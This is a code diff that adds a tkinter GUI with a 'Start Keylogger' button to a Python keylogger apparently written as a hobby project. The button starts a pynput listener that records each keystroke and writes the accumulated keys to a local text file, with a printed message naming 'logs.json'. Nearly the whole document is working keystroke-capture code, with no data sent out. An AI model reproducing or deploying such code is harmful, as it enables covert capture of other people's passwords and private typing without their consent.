@@ -1,5 +1,12 @@
 from pynput import keyboard
 import json
+import tkinter as tk
+from tkinter import *
+
+root =tk.Tk()
+root.geometry("250x300")
+root.title('keylogger Projec')
+
 
 key_list=[]
 x = False
@@ -35,3 +42,20 @@ def on_release(key):
 
     key_strokes=key_strokes + str(key) 
     update_txt_file(str (key_strokes))
+
+def butaction():
+    print("[+] Running keylogger succesfully ! \n[!] Saving the keys logs in 'logs.json'")
+    with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release
+    )as listener:
+        listener.join()
+
+empty=Label(root,text=" ").grid(row=0,column=0)
+empty=Label(root,text=" ").grid(row=1,column=0)
+empty=Label(root,text=" ").grid(row=2,column=0)
+empty=Label(root,text="Keylogger Project",font='verdana 11 bold').grid(row=3,column=3)
+empty=Label(root,text=" ").grid(row=4,column=0)
+
+Button(root,text="Start Keylogger",command=butaction).grid(row=5,column=3)
+root.mainloop()
